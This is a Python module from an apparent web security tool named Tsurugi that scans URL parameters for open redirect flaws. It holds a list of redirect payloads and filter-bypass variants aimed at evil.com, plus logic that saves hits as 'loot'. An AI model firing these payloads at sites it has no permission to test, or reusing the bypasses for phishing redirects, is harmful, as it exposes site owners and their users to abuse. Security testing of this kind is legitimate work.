# HikariSystem Tsurugi/modules/redirect.py
"""
OPEN REDIRECT SCANNER MODULE
Detects Unvalidated Redirects and Forwards
"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from core.requester import TsurugiSession
from rich.panel import Panel

# Common Open Redirect Payloads (Bypass techniques)
REDIRECT_PAYLOADS = [
    "http://evil.com",
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "\\\\evil.com",
    "http:evil.com",
    "/\\/evil.com",
    "/evil.com", # Relative redirect (often valid but worth noting if it accepts anything)
    "http://google.com",
    # Filter Bypasses
    "http://evil.com%2F.target.com", # Obfuscation
    "http://target.com@evil.com", # Credential abuse
    "http://target.com.evil.com", # Subdomain/Suffix
    "%09/evil.com", # Whitespace bypass
    "\r\n/evil.com", # CRLF
]

def run_redirect_scan(url: str, cookie: str = None, proxy: str = None):
    """
    Scan for Open Redirect vulnerabilities.
    """
    console.print(f"\n[bold magenta][*] OPEN REDIRECT SCANNER[/bold magenta] -> [yellow]{url}[/yellow]")
    
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        log_error("No parameters found to fuzz.")
        return
        
    log_info(f"Testing {len(params)} parameters with {len(REDIRECT_PAYLOADS)} payloads...")
    
    findings = []
    
    for param_name in params.keys():
        console.print(f"Testing parameter: [cyan]{param_name}[/cyan]")
        
        for payload in REDIRECT_PAYLOADS:
            # Create fuzzed URL
            fuzzed = params.copy()
            fuzzed[param_name] = [payload]
            query = urlencode(fuzzed, doseq=True)
            target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
            
            try:
                # We need allow_redirects=False to inspect the 3xx response manually
                resp = requester.get(target_url, allow_redirects=False, timeout=5)
                
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("Location", "")
                    
                    # Check if Location header matches our payload (or contains it significantly)
                    # For //evil.com, browser resolves to http://evil.com, so we check for evil.com
                    payload_domain = "evil.com" if "evil.com" in payload else "google.com"
                    
                    if payload_domain in location:
                        console.print(Panel(
                            f"Payload: {payload}\nLocation Header: {location}",
                            title=f"[!] OPEN REDIRECT DETECTED ({param_name})",
                            border_style="red"
                        ))
                        
                        findings.append({
                            "param": param_name,
                            "payload": payload,
                            "location": location,
                            "url": target_url
                        })
                        
                        # Stop testing this param if we found a working redirect? 
                        # Maybe continue to see which payloads work (some might bypass filters better)
                        # break 
                        
            except Exception as e:
                pass
                
    if findings:
        save_loot("redirect", url, {"target": url, "findings": findings})
        log_success(f"Found {len(findings)} Open Redirect vulnerabilities!")
    else:
        console.print("[green]✓ No Open Redirects found.[/green]")
